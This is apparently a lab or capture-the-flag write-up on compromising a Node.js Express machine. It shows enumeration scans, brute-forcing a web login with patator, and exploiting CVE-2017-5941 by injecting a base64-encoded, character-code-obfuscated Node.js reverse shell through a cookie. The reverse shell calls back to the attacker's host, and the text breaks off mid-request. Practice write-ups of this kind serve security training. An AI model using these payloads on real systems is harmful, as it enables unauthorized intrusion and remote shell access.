# Inteface
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh) 
    * [HTTP](#http)
  * [OS](#os)
    * [Nmap OS Discovery Scan](#nmap-os-discovery-scan)
    * [Nmap OS Aggresive Scan](#nmap-os-aggresive-scan)
    * [Nmap OS Scripts Scan](#nmap-os-scripts-scan)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing) 
    * [Patator](#patator)
    * [Hydra](#hydra)
  * [CVE-2017-5941](#cve-2017-5941) 
    * [EDB-ID-45265](#edb-id-45265)
    * [piyush-saurabh POC](#piyush-saurabh-poc)
    * [EDB-ID-49552](#edb-id-49552)
    * [Custom POC](#custom-poc)
* [Solution](#solution)
* [Explore](#explore)
* [Escalate](#escalate)
* [Lessons Learned](#lessons-learned)

## Summary
* Hostname: inteface
* Description: This machine is easy and right up your node.
* IP Address: 192.168.83.106
* MAC Address: (ref:)
* Domain: WORKGROUP
* TCP Ports and Services
  * 22
    * OpenSSH 7.9
  * 80
    * Node.js Express framework 
* OS 
  * Distro: Debian (ref: Nmap)
  * Kernel: Linux (ref: Nmap)
  * Architecture: (ref:)
* Users and passwords (ref:)
  * root
  * dev-acct:password (ref: patator)
* Vulnerabilities and Exploits
  * CVE-2017-5941 (ref: searchsploit)
    * EDB-ID-45265
    * piyush-saurabh POC
* Flag
  * decbb74608cf8ea31a4664368686fe74
* Hints
  * n/a

# Enumerate
## Setup
```bash
TARGET=192.168.83.106
NAME=interface
new-ctf $NAME
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 17:13 EDT
Nmap scan report for 192.168.83.106
Host is up (0.074s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
```

## Services
### SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://192.168.83.106

# output
NSTR
```

### HTTP
```bash
dirb http://$TARGET -r -z10 -o scans/$NAME-dirb-common
dirb http://$TARGET -w /usr/share/wordlists/dirb/big.txt -r -z10 -o scans/$NAME-dirb-big

# output
---- Scanning URL: http://192.168.83.106/ ----
+ http://192.168.83.106/favicon.ico (CODE:200|SIZE:948)                                                                               
+ http://192.168.83.106/index.html (CODE:200|SIZE:703) 
```
```bash
dirsearch -u 192.168.83.106 -e php -o /home/victor/oscp/pg/labs/interface/scans/interface-dirsearch-php --format=simple

# output
NSTR
```
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.83.106
+ Target Hostname:    192.168.83.106
+ Target Port:        80
+ Start Time:         2021-07-04 17:36:52 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 1351 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-07-04 17:38:50 (GMT-4) (118 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## OS
### Nmap OS Discovery Scan
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 17:27 EDT
Nmap scan report for 192.168.83.106
Host is up (0.078s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/4%OT=22%CT=1%CU=38193%PV=Y%DS=2%DC=I%G=Y%TM=60E227BB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%II=I%TS=A)OPS(O1=M5
OS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O
OS:6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

### Nmap Aggressive Scan
```bash
sudo nmap 192.168.83.106 -A -oN scans/interface-nmap-aggressive

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 17:19 EDT
Nmap scan report for 192.168.83.106
Host is up (0.080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 08:50:f6:e6:aa:44:d6:c4:f1:ca:3c:d1:d9:18:43:4d (RSA)
|   256 ed:c6:e6:95:88:99:58:31:14:20:38:83:01:e2:e7:15 (ECDSA)
|_  256 ba:65:96:08:a2:e2:f5:1f:af:88:6e:55:c7:9c:5f:b1 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: App
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/4%OT=22%CT=1%CU=33200%PV=Y%DS=2%DC=T%G=Y%TM=60E225FF
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M5
OS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O
OS:6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

### Nmap Scripts Scan
```bash
sudo nmap 192.168.83.106 -sC -oN scans/interface-nmap-scripts

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 17:37 EDT
Nmap scan report for 192.168.83.106
Host is up (0.074s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 08:50:f6:e6:aa:44:d6:c4:f1:ca:3c:d1:d9:18:43:4d (RSA)
|   256 ed:c6:e6:95:88:99:58:31:14:20:38:83:01:e2:e7:15 (ECDSA)
|_  256 ba:65:96:08:a2:e2:f5:1f:af:88:6e:55:c7:9c:5f:b1 (ED25519)
80/tcp open  http
|_http-title: App

Nmap done: 1 IP address (1 host up) scanned in 10.30 seconds
```

# Exploit
## Password Guessing
### Patator
This worked! Patator discovered a valid login (dev-acct:password).
```bash
# usernames: http=192.168.132.106/api/users
# python -c "names = <names>; for name in names: print name" | sort | uniq
# grep admin, dev, test
patator http_fuzz url=http://192.168.132.106/login method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyou.txt -x ignore:fgrep=Unauthorized

# output
09:39:52 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.1 at 2021-07-05 09:39 EDT
09:39:52 patator    INFO -                                                                              
09:39:52 patator    INFO - code size:clen       time | candidate                          |   num | mesg
09:39:52 patator    INFO - -----------------------------------------------------------------------------
09:39:52 patator    INFO - 200  330:2          0.153 | dev-acct:password                  |     4 | HTTP/1.1 200 OK
```

### Hydra
This did not work (Hydra never sent any actual web requests; observed using Wireshark).
```bash
hydra -l dev-acct -P /usr/share/wordlists/rockyou.txt 192.168.132.106 http-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http://192.168.132.106:H=Origin: http://192.168.132.106:Unauthorized"

# output
NSTR
```

## CVE-2017-5941
### EDB-ID-45265
This is not an exploit...
```bash
searchsploit node.js
mkdir edb-id-45265
cd edb-id-45265
searchsploit -x 45265
cat 45265.js
```

### piyush-saurabh POC
This did not work.
```bash
mkdir piyush-saurabh-poc
cd piyush-saurabh-poc
wget https://raw.githubusercontent.com/piyush-saurabh/exploits/master/nodejsshell.py
sudo nc -nvlp 80
python nodejsshell 192.168.49.83 80
echo '<javascript_code>' | base64
# use the base64 code as a cookie value
```

### EDB-ID-49552
This did not work.
```bash
mkdir edb-id-49552
cd edb-id-49552
searchsploit -m 49552
vim 49552.py # modify exploit
python 49552.py
```

### Custom POC
Steps summarized.
```bash
python nodejsshell.py 192.168.49.132 80
echo -n 'javascript_payload' | base64 -w0 # no new lines; wrap zero lines
# append this to the Cookie header (after connect.sid) profile=<encoded_string>
# connect.sid represents the authorization to do stuff (dev-acct authentication)
```

Example.
```bash
python nodejsshell.py 192.168.49.132 80

# output
[+] LHOST = 192.168.49.132
[+] LPORT = 80
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,52,57,46,49,51,50,34,59,10,80,79,82,84,61,34,56,48,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))

echo -n 'eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,52,57,46,49,51,50,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))' | base64 -w0

# output
ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDU3LDUwLDQ2LDQ5LDU0LDU2LDQ2LDUyLDU3LDQ2LDQ5LDUxLDUwLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDUyLDUyLDUxLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKQ==

# HTTP request
# I was able to verify my connect.sid value (as dev-acct) by changing the color-theme
# once I confirmed I had valid credentials, I appended my payload to the Cookie header via the "profile" parameter
POST /api/settings HTTP/1.1
Host: 192.168.132.106
Content-Length: 22
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/json
Origin: http://192.168.132.106
Referer: http://192.168.132.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AZqDOBhU5JUHa-6zADULUY_e3_b8ykxng.faM0vT9IFvXPrdv%2FDKoUuvP4HY9PMZnwQA3Silrz7v4; profile=ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDU3LDUwLDQ2LDQ5LDU0LDU2LDQ2LDUyLDU3LDQ2LDQ5LDUxLDUwLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDUyLDUyLDUxLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDM